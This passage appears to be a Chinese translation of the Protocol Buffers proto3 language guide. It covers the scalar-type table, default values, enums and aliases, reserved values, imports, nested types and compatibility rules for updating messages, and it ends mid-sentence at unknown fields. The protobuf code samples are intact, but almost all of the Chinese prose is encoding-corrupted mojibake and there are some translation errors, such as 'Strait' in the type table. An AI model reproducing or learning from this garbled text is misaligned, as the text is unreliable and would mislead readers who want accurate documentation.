Boolean     |                                                              | Boolean   | Boolean     | Boolean          | Boolean | TrueClass / FalseClass       | Boolean     | Boolean           |\n| string      | å­—ç¬¦ä¸²å¿…é¡»å§‹ç»ˆåŒ…å«UTF-8ç¼–ç æˆ–7ä½ASCIIæ–‡æœ¬ã€‚                  | string    | string      | str / unicode[4] | string  | String (UTF-8)               | string      | string            |\n| byte        | å¯ä»¥åŒ…å«ä»»æ„å­—èŠ‚åºåˆ—ã€‚                                       | string    | Byte string | Strait           | []byte  | String (ASCII-8BIT)          | Byte string | string            |\n\n\n\nåœ¨[åè®®ç¼“å†²åŒºç¼–ç ä¸­](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fencoding)åºåˆ—åŒ–æ¶ˆæ¯æ—¶ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°æœ‰å…³å¦‚ä½•ç¼–ç è¿™äº›ç±»å‹çš„æ›´å¤šä¿¡æ¯ã€‚\n\n[1]åœ¨Javaä¸­ï¼Œæ— ç¬¦å·çš„32ä½å’Œ64ä½æ•´æ•°ä½¿ç”¨å®ƒä»¬çš„å¸¦ç¬¦å·å¯¹åº”è¡¨ç¤ºï¼Œæœ€é«˜ä½åªæ˜¯å­˜å‚¨åœ¨ç¬¦å·ä½ä¸­ã€‚\n\n[2]åœ¨æ‰€æœ‰æƒ…å†µä¸‹ï¼Œå°†å€¼è®¾ç½®ä¸ºå­—æ®µå°†æ‰§è¡Œç±»å‹æ£€æŸ¥ä»¥ç¡®ä¿å…¶æœ‰æ•ˆã€‚\n\n[3] 64ä½æˆ–æ— ç¬¦å·32ä½æ•´æ•°åœ¨è§£ç æ—¶å§‹ç»ˆè¡¨ç¤ºä¸ºlongï¼Œä½†å¦‚æœåœ¨è®¾ç½®å­—æ®µæ—¶ç»™å‡ºintï¼Œåˆ™å¯ä»¥ä¸ºintã€‚åœ¨æ‰€æœ‰æƒ…å†µä¸‹ï¼Œè¯¥å€¼å¿…é¡»é€‚åˆè®¾ç½®æ—¶è¡¨ç¤ºçš„ç±»å‹ã€‚è§[2]ã€‚\n\n[4] Pythonå­—ç¬¦ä¸²åœ¨è§£ç æ—¶è¡¨ç¤ºä¸ºunicodeï¼Œä½†å¦‚æœç»™å‡ºäº†ASCIIå­—ç¬¦ä¸²ï¼Œåˆ™å¯ä»¥æ˜¯strï¼ˆè¿™å¯èƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼‰ã€‚\n\n[5] Integerç”¨äº64ä½è®¡ç®—æœºï¼Œå­—ç¬¦ä¸²ç”¨äº32ä½è®¡ç®—æœºã€‚\n\n\n\n### 3. é»˜è®¤å€¼\n\nè§£ææ¶ˆæ¯æ—¶ï¼Œå¦‚æœç¼–ç æ¶ˆæ¯ä¸åŒ…å«ç‰¹å®šçš„å•æ•°å…ƒç´ ï¼Œåˆ™è§£æå¯¹è±¡ä¸­çš„ç›¸åº”å­—æ®µå°†è®¾ç½®ä¸ºè¯¥å­—æ®µçš„é»˜è®¤å€¼ã€‚è¿™äº›é»˜è®¤å€¼æ˜¯ç‰¹å®šäºç±»å‹çš„ï¼š\n\n- å¯¹äºå­—ç¬¦ä¸²ï¼Œé»˜è®¤å€¼ä¸ºç©ºå­—ç¬¦ä¸²ã€‚\n- å¯¹äºå­—èŠ‚ï¼Œé»˜è®¤å€¼ä¸ºç©ºå­—èŠ‚ã€‚\n- å¯¹äºboolsï¼Œé»˜è®¤å€¼ä¸ºfalseã€‚\n- å¯¹äºæ•°å­—ç±»å‹ï¼Œé»˜è®¤å€¼ä¸ºé›¶ã€‚\n- å¯¹äº[æšä¸¾](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23enum)ï¼Œé»˜è®¤å€¼æ˜¯ç¬¬**ä¸€ä¸ªå®šä¹‰çš„æšä¸¾å€¼**ï¼Œè¯¥**å€¼**å¿…é¡»ä¸º0ã€‚\n- å¯¹äºæ¶ˆæ¯å­—æ®µï¼Œæœªè®¾ç½®è¯¥å­—æ®µã€‚å®ƒçš„ç¡®åˆ‡å€¼å–å†³äºè¯­è¨€ã€‚æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œ è¯·å‚é˜…[ç”Ÿæˆçš„ä»£ç æŒ‡](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)\n\né‡å¤å­—æ®µçš„é»˜è®¤å€¼ä¸ºç©ºï¼ˆé€šå¸¸æ˜¯ç›¸åº”è¯­è¨€çš„ç©ºåˆ—è¡¨ï¼‰ã€‚\n\nè¯·æ³¨æ„ï¼Œå¯¹äºæ ‡é‡æ¶ˆæ¯å­—æ®µï¼Œä¸€æ—¦è§£æäº†æ¶ˆæ¯ï¼Œå°±æ— æ³•ç¡®å®šå­—æ®µæ˜¯å¦æ˜¾å¼è®¾ç½®ä¸ºé»˜è®¤å€¼ï¼ˆä¾‹å¦‚ï¼Œæ˜¯å¦è®¾ç½®äº†å¸ƒå°”å€¼`false`ï¼‰æˆ–è€…æ ¹æœ¬æ²¡æœ‰è®¾ç½®ï¼šæ‚¨åº”è¯¥è®°ä½è¿™ä¸€ç‚¹åœ¨å®šä¹‰æ¶ˆæ¯ç±»å‹æ—¶ã€‚ä¾‹å¦‚ï¼Œ`false`å¦‚æœæ‚¨ä¸å¸Œæœ›é»˜è®¤æƒ…å†µä¸‹ä¹Ÿå‘ç”Ÿè¿™ç§è¡Œä¸ºï¼Œé‚£ä¹ˆåœ¨è®¾ç½®ä¸ºæ—¶ï¼Œæ²¡æœ‰ä¸€ä¸ªå¸ƒå°”å€¼å¯ä»¥å¯ç”¨æŸäº›è¡Œä¸ºã€‚è¿˜è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœä¸€ä¸ªæ ‡æ¶ˆæ¯å­—æ®µ**è¢«**è®¾ç½®ä¸ºé»˜è®¤å€¼ï¼Œè¯¥å€¼å°†ä¸ä¼šåœ¨ç”µçº¿ä¸Šè¿è½½ã€‚\n\næœ‰å…³é»˜è®¤å€¼å¦‚ä½•åœ¨ç”Ÿæˆçš„ä»£ç ä¸­å·¥ä½œçš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…æ‰€é€‰è¯­è¨€çš„[ç”Ÿæˆä»£ç æŒ‡å—](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)ã€‚\n\n### 4. æšä¸¾\n\nåœ¨å®šä¹‰æ¶ˆæ¯ç±»å‹æ—¶ï¼Œæ‚¨å¯èƒ½å¸Œæœ›å…¶ä¸­ä¸€ä¸ªå­—æ®µåªæœ‰ä¸€ä¸ªé¢„å®šä¹‰çš„å€¼åˆ—è¡¨ã€‚ä¾‹å¦‚ï¼Œå‡è®¾ä½ æƒ³æ·»åŠ ä¸€ä¸ª `corpus`å­—æ®µæ¯ä¸ª`SearchRequest`ï¼Œå…¶ä¸­è¯­æ–™åº“å¯ä»¥ `UNIVERSAL`ï¼Œ`WEB`ï¼Œ`IMAGES`ï¼Œ`LOCAL`ï¼Œ`NEWS`ï¼Œ`PRODUCTS`æˆ–`VIDEO`ã€‚æ‚¨å¯ä»¥éå¸¸ç®€å•åœ°é€šè¿‡`enum`ä¸ºæ¯ä¸ªå¯èƒ½çš„å€¼æ·»åŠ ä¸€ä¸ªå¸¸é‡æ¥å®šä¹‰æ¶ˆæ¯å®šä¹‰ã€‚\n\nåœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ªå¸¦æœ‰æ‰€æœ‰å¯èƒ½å€¼çš„`enum`è°ƒç”¨`Corpus`ï¼Œä»¥åŠä¸€ä¸ªç±»å‹çš„å­—æ®µ`Corpus`ï¼š\n\n```protobuf\nmessage SearchRequest {\n  string query = 1;\n  int32 page_number = 2;\n  int32 result_per_page = 3;\n  enum Corpus {\n    UNIVERSAL = 0;\n    WEB = 1;\n    IMAGES = 2;\n    LOCAL = 3;\n    NEWS = 4;\n    PRODUCTS = 5;\n    VIDEO = 6;\n  }\n  Corpus corpus = 4;\n}\n```\n\nå¦‚æ‚¨æ‰€è§ï¼Œ`Corpus`æšä¸¾çš„ç¬¬ä¸€ä¸ªå¸¸é‡æ˜ å°„ä¸ºé›¶ï¼šæ¯ä¸ªæšä¸¾å®šä¹‰**å¿…é¡»**åŒ…å«ä¸€ä¸ªæ˜ å°„åˆ°é›¶çš„å¸¸é‡ä½œä¸ºå…¶ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚è¿™æ˜¯å› ä¸ºï¼š\n\n- å¿…é¡»æœ‰ä¸€ä¸ªé›¶å€¼ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥ä½¿ç”¨0ä½œä¸ºæ•°å­—[é»˜è®¤å€¼](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23default)ã€‚\n- é›¶å€¼å¿…é¡»æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä»¥ä¾¿ä¸[proto2](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto)è¯­ä¹‰å…¼å®¹ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªæšä¸¾å€¼å§‹ç»ˆæ˜¯é»˜è®¤å€¼ã€‚\n\n\n\næ‚¨å¯ä»¥é€šè¿‡ä¸ºä¸åŒçš„æšä¸¾å¸¸é‡æŒ‡å®šç›¸åŒçš„å€¼æ¥å®šä¹‰åˆ«åã€‚ä¸ºæ­¤ï¼Œæ‚¨éœ€è¦å°†`allow_alias`é€‰é¡¹è®¾ç½®ä¸º`true`ï¼Œå¦åˆ™åè®®ç¼–è¯‘å™¨å°†åœ¨æ‰¾åˆ°åˆ«åæ—¶ç”Ÿæˆé”™è¯¯æ¶ˆæ¯ã€‚\n\n```protobuf\nenum EnumAllowingAlias {\n  option allow_alias = true;\n  UNKNOWN = 0;\n  STARTED = 1;\n  RUNNING = 1;\n}\nenum EnumNotAllowingAlias {\n  UNKNOWN = 0;\n  STARTED = 1;\n  // RUNNING = 1;  // Uncommenting this line will cause a compile error inside Google and a warning message outside.\n}\n```\n\næšä¸¾å™¨å¸¸é‡å¿…é¡»åœ¨32ä½æ•´æ•°èŒƒå›´å†…ã€‚ç”±äº`enum`å€¼åœ¨çº¿ä¸Šä½¿ç”¨[varintç¼–ç ](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fencoding)ï¼Œå› æ­¤è´Ÿå€¼æ•ˆç‡ä½ï¼Œå› æ­¤ä¸å»ºè®®ä½¿ç”¨ã€‚æ‚¨å¯ä»¥`enum`åœ¨æ¶ˆæ¯å®šä¹‰ä¸­å®šä¹‰sï¼Œå¦‚ä¸Šä¾‹æ‰€ç¤ºï¼Œ`enum`ä¹Ÿå¯ä»¥åœ¨å¤–éƒ¨å®šä¹‰ - è¿™äº›å¯ä»¥åœ¨`.proto`æ–‡ä»¶çš„ä»»ä½•æ¶ˆæ¯å®šä¹‰ä¸­é‡ç”¨ã€‚æ‚¨è¿˜å¯ä»¥ä½¿ç”¨`enum`è¯­æ³•å°†ä¸€ä¸ªæ¶ˆæ¯ä¸­å£°æ˜çš„ç±»å‹ç”¨ä½œå¦ä¸€ä¸ªæ¶ˆæ¯ä¸­çš„å­—æ®µç±»å‹ã€‚ `*MessageType*.*EnumType*`\n\nå½“ä½ åœ¨`.proto`ä½¿ç”¨açš„åè®®ç¼“å†²ç¼–è¯‘å™¨ä¸Šè¿è¡Œæ—¶`enum`ï¼Œç”Ÿæˆçš„ä»£ç å°†å…·æœ‰`enum`Javaæˆ–C ++ çš„ç›¸åº”ä»£ç ï¼Œè¿™`EnumDescriptor`æ˜¯Pythonçš„ä¸€ä¸ªç‰¹æ®Šç±»ï¼Œç”¨äºåœ¨è¿è¡Œæ—¶ç”Ÿæˆçš„ç±»ä¸­åˆ›å»ºä¸€ç»„å¸¦æœ‰æ•´æ•°å€¼çš„ç¬¦å·å¸¸é‡ã€‚\n\nåœ¨ååºåˆ—åŒ–æœŸé—´ï¼Œå°†åœ¨æ¶ˆæ¯ä¸­ä¿ç•™æ— æ³•è¯†åˆ«çš„æšä¸¾å€¼ï¼Œä½†æ˜¯å½“ååºåˆ—åŒ–æ¶ˆæ¯æ—¶ï¼Œå¦‚ä½•è¡¨ç¤ºè¿™ç§å€¼å–å†³äºè¯­è¨€ã€‚åœ¨æ”¯æŒå…·æœ‰è¶…å‡ºæŒ‡å®šç¬¦å·èŒƒå›´çš„å€¼çš„å¼€æ”¾æšä¸¾ç±»å‹çš„è¯­è¨€ä¸­ï¼Œä¾‹å¦‚C ++å’ŒGoï¼ŒæœªçŸ¥çš„æšä¸¾å€¼ä»…ä½œä¸ºå…¶åŸºç¡€æ•´æ•°è¡¨ç¤ºå­˜å‚¨ã€‚åœ¨å…·æœ‰å°é—­æšä¸¾ç±»å‹ï¼ˆå¦‚Javaï¼‰çš„è¯­è¨€ä¸­ï¼Œæšä¸¾ä¸­çš„å¤§å°å†™ç”¨äºè¡¨ç¤ºæ— æ³•è¯†åˆ«çš„å€¼ï¼Œå¹¶ä¸”å¯ä»¥ä½¿ç”¨ç‰¹æ®Šè®¿é—®å™¨è®¿é—®åŸºç¡€æ•´æ•°ã€‚åœ¨ä»»ä½•ä¸€ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæ¶ˆæ¯è¢«åºåˆ—åŒ–ï¼Œåˆ™ä»ç„¶ä¼šä½¿ç”¨æ¶ˆæ¯åºåˆ—åŒ–æ— æ³•è¯†åˆ«çš„å€¼ã€‚\n\næœ‰å…³å¦‚ä½•`enum`åœ¨åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨æ¶ˆæ¯çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…æ‰€é€‰è¯­è¨€çš„[ç”Ÿæˆä»£ç æŒ‡å—](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)ã€‚\n\n\n\n##### 4.1 ä¿ç•™å€¼\n\nå¦‚æœé€šè¿‡å®Œå…¨åˆ é™¤æšä¸¾æ¡ç›®æˆ–å°†å…¶æ³¨é‡Šæ‰æ¥[æ›´æ–°](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23updating)æšä¸¾ç±»å‹ï¼Œåˆ™æœªæ¥ç”¨æˆ·å¯ä»¥åœ¨å¯¹ç±»å‹è¿›è¡Œè‡ªå·±çš„æ›´æ–°æ—¶é‡ç”¨è¯¥æ•°å€¼ã€‚å¦‚æœä»¥ååŠ è½½ç›¸åŒçš„æ—§ç‰ˆæœ¬ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´ä¸¥é‡é—®é¢˜`.proto`ï¼ŒåŒ…æ‹¬æ•°æ®æŸåï¼Œéšç§é”™è¯¯ç­‰ã€‚ç¡®ä¿ä¸ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µçš„ä¸€ç§æ–¹æ³•æ˜¯æŒ‡å®šå·²åˆ é™¤æ¡ç›®çš„æ•°å€¼ï¼ˆå’Œ/æˆ–åç§°ï¼Œè¿™ä¹Ÿå¯èƒ½å¯¼è‡´JSONåºåˆ—åŒ–é—®é¢˜ï¼‰`reserved`ã€‚å¦‚æœå°†æ¥çš„ä»»ä½•ç”¨æˆ·å°è¯•ä½¿ç”¨è¿™äº›æ ‡è¯†ç¬¦ï¼Œåè®®ç¼“å†²ç¼–è¯‘å™¨å°†ä¼šæŠ±æ€¨ã€‚æ‚¨å¯ä»¥ä½¿ç”¨`max`å…³é”®å­—æŒ‡å®šä¿ç•™çš„æ•°å€¼èŒƒå›´è¾¾åˆ°æœ€å¤§å¯èƒ½å€¼ã€‚\n\n```protobuf\nenum Foo {\n  reserved 2, 15, 9 to 11, 40 to max;\n  reserved \"FOO\", \"BAR\";\n}\n```\n\nè¯·æ³¨æ„ï¼Œæ‚¨ä¸èƒ½åœ¨åŒä¸€`reserved`è¯­å¥ä¸­æ··åˆå­—æ®µåç§°å’Œæ•°å€¼ã€‚\n\n\n\n### 5. ä½¿ç”¨å…¶ä»–æ¶ˆæ¯ç±»å‹\n\næ‚¨å¯ä»¥ä½¿ç”¨å…¶ä»–æ¶ˆæ¯ç±»å‹ä½œä¸ºå­—æ®µç±»å‹ã€‚ä¾‹å¦‚ï¼Œå‡è®¾ä½ æƒ³åŒ…æ‹¬`Result`æ¯ä¸ªæ¶ˆæ¯çš„`SearchResponse`æ¶ˆæ¯-è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œä½ å¯ä»¥å®šä¹‰ä¸€ä¸ª`Result`åœ¨åŒä¸€ä¸ªæ¶ˆæ¯ç±»å‹`.proto`ï¼Œç„¶åæŒ‡å®šç±»å‹çš„å­—æ®µ`Result`ä¸­`SearchResponse`ï¼š\n\n```protobuf\nmessage SearchResponse {\n  repeated Result results = 1;\n}\n\nmessage Result {\n  string url = 1;\n  string title = 2;\n  repeated string snippets = 3;\n}\n```\n\n\n\n##### 5.1 å¯¼å…¥å®šä¹‰\n\nåœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œ`Result`æ¶ˆæ¯ç±»å‹åœ¨åŒä¸€æ–‡ä»¶ä¸­å®šä¹‰`SearchResponse`- å¦‚æœè¦ç”¨ä½œå­—æ®µç±»å‹çš„æ¶ˆæ¯ç±»å‹å·²åœ¨å¦ä¸€ä¸ª`.proto`æ–‡ä»¶ä¸­å®šä¹‰ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿ\n\næ‚¨å¯ä»¥`.proto`é€šè¿‡*å¯¼å…¥*æ¥ä½¿ç”¨å…¶ä»–æ–‡ä»¶ä¸­çš„å®šä¹‰ã€‚è¦å¯¼å…¥å…¶ä»–`.proto`äººçš„å®šä¹‰ï¼Œè¯·åœ¨æ–‡ä»¶é¡¶éƒ¨æ·»åŠ importè¯­å¥ï¼š\n\n```protobuf\nimport \"myproject/other_protos.proto\";\n```\n\né»˜è®¤æƒ…å†µä¸‹ï¼Œæ‚¨åªèƒ½ä½¿ç”¨ç›´æ¥å¯¼å…¥`.proto`æ–‡ä»¶ä¸­çš„å®šä¹‰ã€‚ä½†æ˜¯ï¼Œæœ‰æ—¶æ‚¨å¯èƒ½éœ€è¦å°†`.proto`æ–‡ä»¶ç§»åŠ¨åˆ°æ–°ä½ç½®ã€‚`.proto`ç°åœ¨ï¼Œæ‚¨å¯ä»¥`.proto`åœ¨æ—§ä½ç½®æ”¾ç½®ä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ï¼Œä»¥ä½¿ç”¨è¯¥`import public`æ¦‚å¿µå°†æ‰€æœ‰å¯¼å…¥è½¬å‘åˆ°æ–°ä½ç½®ï¼Œè€Œä¸æ˜¯ç›´æ¥ç§»åŠ¨æ–‡ä»¶å¹¶åœ¨ä¸€æ¬¡æ›´æ”¹ä¸­æ›´æ–°æ‰€æœ‰è°ƒç”¨ç«™ç‚¹ã€‚`import public`ä»»ä½•å¯¼å…¥åŒ…å«è¯¥`import public`è¯­å¥çš„protoçš„äººéƒ½å¯ä»¥ä¼ é€’ä¾èµ–å…³ç³»ã€‚ä¾‹å¦‚ï¼š\n\n```protobuf\n// new.proto\n// All definitions are moved here\n\n// old.proto\n//This is the proto that all clients are importing.\nimport publicâ€œnew.protoâ€;\nimportâ€œother.protoâ€;\n\n// client.proto\nimport \"old.proto\";\n//æ‚¨ä½¿ç”¨old.protoå’Œnew.protoä¸­çš„å®šä¹‰ï¼Œä½†ä¸ä½¿ç”¨other.proto\n```\n\nåè®®ç¼–è¯‘å™¨ä½¿ç”¨`-I`/ `--proto_path`flag åœ¨åè®®ç¼–è¯‘å™¨å‘½ä»¤è¡Œä¸­æŒ‡å®šçš„ä¸€ç»„ç›®å½•ä¸­æœç´¢å¯¼å…¥çš„æ–‡ä»¶ ã€‚å¦‚æœæ²¡æœ‰ç»™å‡ºæ ‡å¿—ï¼Œå®ƒå°†æŸ¥æ‰¾è°ƒç”¨ç¼–è¯‘å™¨çš„ç›®å½•ã€‚é€šå¸¸ï¼Œæ‚¨åº”è¯¥å°†`--proto_path`æ ‡å¿—è®¾ç½®ä¸ºé¡¹ç›®çš„æ ¹ç›®å½•ï¼Œå¹¶å¯¹æ‰€æœ‰å¯¼å…¥ä½¿ç”¨å®Œå…¨é™å®šåç§°ã€‚\n\n##### 5.2 ä½¿ç”¨proto2æ¶ˆæ¯ç±»å‹\n\nå¯ä»¥å¯¼å…¥[proto2](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto)æ¶ˆæ¯ç±»å‹å¹¶åœ¨proto3æ¶ˆæ¯ä¸­ä½¿ç”¨å®ƒä»¬ï¼Œåä¹‹äº¦ç„¶ã€‚ä½†æ˜¯ï¼Œproto2æšä¸¾ä¸èƒ½ç›´æ¥ç”¨äºproto3è¯­æ³•ï¼ˆå¦‚æœå¯¼å…¥çš„proto2æ¶ˆæ¯ä½¿ç”¨å®ƒä»¬å°±å¯ä»¥äº†ï¼‰ã€‚\n\n\n\n### 6. åµŒå¥—ç±»å‹\n\næ‚¨å¯ä»¥åœ¨å…¶ä»–æ¶ˆæ¯ç±»å‹ä¸­å®šä¹‰å’Œä½¿ç”¨æ¶ˆæ¯ç±»å‹ï¼Œå¦‚ä¸‹ä¾‹æ‰€ç¤º - æ­¤å¤„`Result`æ¶ˆæ¯åœ¨æ¶ˆæ¯ä¸­å®šä¹‰`SearchResponse`ï¼š\n\n```protobuf\nmessage SearchResponse {\n  message Result {\n    string url = 1;\n    string title = 2;\n    repeated string snippets = 3;\n  }\n  repeated Result results = 1;\n}\n```\n\nå¦‚æœè¦åœ¨å…¶çˆ¶æ¶ˆæ¯ç±»å‹ä¹‹å¤–é‡ç”¨æ­¤æ¶ˆæ¯ç±»å‹ï¼Œè¯·å°†å…¶ç§°ä¸ºï¼š `*Parent*.*Type*`\n\n```protobuf\nmessage SomeOtherMessage {\n  SearchResponse.Result result = 1;\n}\n```\n\næ‚¨å¯ä»¥æ ¹æ®éœ€è¦æ·±å…¥åµŒå¥—æ¶ˆæ¯ï¼š\n\n```protobuf\nmessage Outer {       // Level 0\n  message MiddleAA {  // Level 1\n    message Inner {   // Level 2\n      int64 ival = 1;\n      bool  booly = 2;\n    }\n  }\n  message MiddleBB {  // Level 1\n    message Inner {   // Level 2\n      int32 ival = 1;\n      bool  booly = 2;\n    }\n  }\n}\n```\n\n\n\n### 7. æ›´æ–°æ¶ˆæ¯ç±»å‹\n\nå¦‚æœç°æœ‰çš„æ¶ˆæ¯ç±»å‹ä¸å†æ»¡è¶³æ‚¨çš„æ‰€æœ‰éœ€æ±‚ - ä¾‹å¦‚ï¼Œæ‚¨å¸Œæœ›æ¶ˆæ¯æ ¼å¼å…·æœ‰é¢å¤–çš„å­—æ®µ - ä½†æ‚¨ä»ç„¶å¸Œæœ›ä½¿ç”¨ä½¿ç”¨æ—§æ ¼å¼åˆ›å»ºçš„ä»£ç ï¼Œè¯·ä¸è¦æ‹…å¿ƒï¼åœ¨ä¸ç ´åä»»ä½•ç°æœ‰ä»£ç çš„æƒ…å†µä¸‹æ›´æ–°æ¶ˆæ¯ç±»å‹éå¸¸ç®€å•ã€‚è¯·è®°ä½ä»¥ä¸‹è§„åˆ™ï¼š\n\n- è¯·å‹¿æ›´æ”¹ä»»ä½•ç°æœ‰å­—æ®µçš„å­—æ®µç¼–å·ã€‚\n- å¦‚æœæ·»åŠ æ–°å­—æ®µï¼Œåˆ™ä½¿ç”¨â€œæ—§â€æ¶ˆæ¯æ ¼å¼æŒ‰ä»£ç åºåˆ—åŒ–çš„ä»»ä½•æ¶ˆæ¯ä»å¯ç”±æ–°ç”Ÿæˆçš„ä»£ç è¿›è¡Œè§£æã€‚æ‚¨åº”è¯¥è®°ä½è¿™äº›å…ƒç´ çš„[é»˜è®¤å€¼](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23default)ï¼Œä»¥ä¾¿æ–°ä»£ç å¯ä»¥æ­£ç¡®åœ°ä¸æ—§ä»£ç ç”Ÿæˆçš„æ¶ˆæ¯è¿›è¡Œäº¤äº’ã€‚åŒæ ·ï¼Œæ‚¨çš„æ–°ä»£ç åˆ›å»ºçš„æ¶ˆæ¯å¯ä»¥ç”±æ—§ä»£ç è§£æï¼šæ—§çš„äºŒè¿›åˆ¶æ–‡ä»¶åœ¨è§£ææ—¶åªæ˜¯å¿½ç•¥æ–°å­—æ®µã€‚æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…â€œ [æœªçŸ¥å­—æ®µâ€](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23unknowns)éƒ¨åˆ†\n- åªè¦åœ¨æ›´æ–°çš„æ¶ˆæ¯ç±»å‹ä¸­ä¸å†ä½¿ç”¨å­—æ®µç¼–å·ï¼Œå°±å¯ä»¥åˆ é™¤å­—æ®µã€‚æ‚¨å¯èƒ½å¸Œæœ›é‡å‘½åè¯¥å­—æ®µï¼Œå¯èƒ½æ·»åŠ å‰ç¼€â€œOBSOLETE_â€ï¼Œæˆ–è€…[ä¿ç•™](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23reserved)å­—æ®µç¼–å·ï¼Œä»¥ä¾¿æ‚¨çš„æœªæ¥ç”¨æˆ·`.proto`ä¸ä¼šæ„å¤–åœ°é‡å¤ä½¿ç”¨è¯¥ç¼–å·ã€‚\n- `int32`ï¼Œ`uint32`ï¼Œ`int64`ï¼Œ`uint64`ï¼Œå’Œ`bool`éƒ½æ˜¯å…¼å®¹çš„-è¿™æ„å‘³ç€ä½ å¯ä»¥æ”¹å˜è¿™äº›ç±»å‹åˆ°å¦ä¸€ä¸ªçš„ä¸€ä¸ªåœºä¸ç ´åforwards-æˆ–å‘åå…¼å®¹ã€‚å¦‚æœä»å¯¼çº¿ä¸­è§£æå‡ºä¸€ä¸ªä¸ç¬¦åˆç›¸åº”ç±»å‹çš„æ•°å­—ï¼Œæ‚¨å°†è·å¾—ä¸åœ¨C ++ä¸­å°†è¯¥æ•°å­—è½¬æ¢ä¸ºè¯¥ç±»å‹ç›¸åŒçš„æ•ˆæœï¼ˆä¾‹å¦‚ï¼Œå¦‚æœå°†64ä½æ•°å­—ä½œä¸ºint32è¯»å–ï¼Œå®ƒå°†è¢«æˆªæ–­ä¸º32ä½ï¼‰ã€‚\n- `sint32`å¹¶ä¸”`sint64`å½¼æ­¤å…¼å®¹ä½†ä¸å…¶ä»–æ•´æ•°ç±»å‹*ä¸*å…¼å®¹ã€‚\n- `string``bytes`åªè¦å­—èŠ‚æ˜¯æœ‰æ•ˆçš„UTF-8 ï¼Œå®ƒä»¬æ˜¯å…¼å®¹çš„ã€‚\n- `bytes`å¦‚æœå­—èŠ‚åŒ…å«æ¶ˆæ¯çš„ç¼–ç ç‰ˆæœ¬ï¼Œåˆ™åµŒå…¥æ¶ˆæ¯æ˜¯å…¼å®¹çš„ã€‚\n- `fixed32`ä¸å…¼å®¹`sfixed32`ï¼Œå¹¶`fixed64`ç”¨`sfixed64`ã€‚\n- `enum`ä¸å…¼å®¹`int32`ï¼Œ`uint32`ï¼Œ`int64`ï¼Œå’Œ`uint64`ç”µçº¿æ ¼å¼æ¡æ¬¾ï¼ˆæ³¨æ„ï¼Œå¦‚æœä»–ä»¬ä¸é€‚åˆçš„å€¼å°†è¢«æˆªæ–­ï¼‰ã€‚ä½†è¯·æ³¨æ„ï¼Œåœ¨ååºåˆ—åŒ–æ¶ˆæ¯æ—¶ï¼Œå®¢æˆ·ç«¯ä»£ç å¯èƒ½ä¼šä»¥ä¸åŒæ–¹å¼å¯¹å¾…å®ƒä»¬ï¼šä¾‹å¦‚ï¼Œ`enum`å°†åœ¨æ¶ˆæ¯ä¸­ä¿ç•™æœªè¯†åˆ«çš„proto3 ç±»å‹ï¼Œä½†åœ¨ååºåˆ—åŒ–æ¶ˆæ¯æ—¶å¦‚ä½•è¡¨ç¤ºè¿™ç§ç±»å‹å–å†³äºè¯­è¨€ã€‚Intå­—æ®µæ€»æ˜¯ä¿ç•™å®ƒä»¬çš„ä»·å€¼ã€‚\n- å°†å•ä¸ªå€¼æ›´æ”¹ä¸º**æ–°** æˆå‘˜`oneof`æ˜¯å®‰å…¨ä¸”äºŒè¿›åˆ¶å…¼å®¹çš„ã€‚`oneof`å¦‚æœæ‚¨ç¡®å®šæ²¡æœ‰ä»£ç ä¸€æ¬¡è®¾ç½®å¤šä¸ªå­—æ®µï¼Œåˆ™å°†å¤šä¸ªå­—æ®µç§»åŠ¨åˆ°æ–°å­—æ®µå¯èƒ½æ˜¯å®‰å…¨çš„ã€‚å°†ä»»ä½•å­—æ®µç§»åŠ¨åˆ°ç°æœ‰å­—æ®µ`oneof`å¹¶ä¸å®‰å…¨ã€‚\n\n\n\n### 8. æœªçŸ¥å­—æ®µ\n\næœªçŸ¥å­—æ®µæ˜¯æ ¼å¼è‰¯å¥½çš„åè®®ç¼“å†²åŒºåºåˆ—åŒ–æ•°æ®ï¼Œè¡¨ç¤ºè§£æå™¨æ— 